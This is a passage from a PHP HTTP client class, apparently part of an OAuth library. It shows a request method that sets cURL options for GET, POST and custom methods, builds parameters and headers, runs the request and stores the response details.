      curl_setopt($c, CURLOPT_WRITEFUNCTION, array($this, 'curlWrite'));
    }

    switch ($this->method) {
      case 'GET':
        break;
      case 'POST':
        curl_setopt($c, CURLOPT_POST, true);
        curl_setopt($c, CURLOPT_POSTFIELDS, $this->request_params);
        break;
      default:
        curl_setopt($c, CURLOPT_CUSTOMREQUEST, $this->method);
    }

    if ( ! empty($this->request_params) ) {
      // if not doing multipart we need to implode the parameters
      if ( ! $this->config['multipart'] ) {
        foreach ($this->request_params as $k => $v) {
          $ps[] = "{$k}={$v}";
        }
        $this->request_params = implode('&', $ps);
      }
      curl_setopt($c, CURLOPT_POSTFIELDS, $this->request_params);
    }

    if ( ! empty($this->headers)) {
      foreach ($this->headers as $k => $v) {
        $headers[] = trim($k . ': ' . $v);
      }
      curl_setopt($c, CURLOPT_HTTPHEADER, $headers);
    }

    if (isset($this->config['prevent_request']) && (true == $this->config['prevent_request']))
      return 0;

    // do it!
    $response = curl_exec($c);
    $code = curl_getinfo($c, CURLINFO_HTTP_CODE);
    $info = curl_getinfo($c);
    $error = curl_error($c);
    $errno = curl_errno($c);
    curl_close($c);

    // store the response
    $this->response['code'] = $code;
    $this->response['response'] = $response;
    $this->response['info'] = $info;
    $this->response['error'] = $error;
    $this->response['errno'] = $errno;

    if (!isset($this->response['raw'])) {
      $this->response['raw'] = '';
    }
    $this->response['raw'] .= $response;

    return $code;
  }
}